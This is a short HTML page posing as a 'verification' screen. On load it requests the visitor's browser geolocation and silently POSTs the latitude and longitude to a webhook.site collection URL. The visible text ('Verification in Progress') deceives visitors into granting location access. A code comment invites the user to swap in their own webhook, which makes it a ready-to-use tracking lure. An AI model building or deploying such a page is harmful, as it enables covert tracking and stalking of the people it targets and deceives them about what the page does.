<!DOCTYPE html>
<html>
<head>
    <title>Verification Page</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Send the data to Webhook.site or any backend
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://webhook.site/82d4ab06-c8c1-4433-9d67-dfd3ec117a9d", true); // Replace with your unique Webhook.site URL or backend URL
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ latitude: lat, longitude: lon }));

            alert("Thank you for verifying your location!");
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("You denied the request for Geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>Verification in Progress</h1>
    <p>Please wait while we verify your details...</p>
</body>
</html>
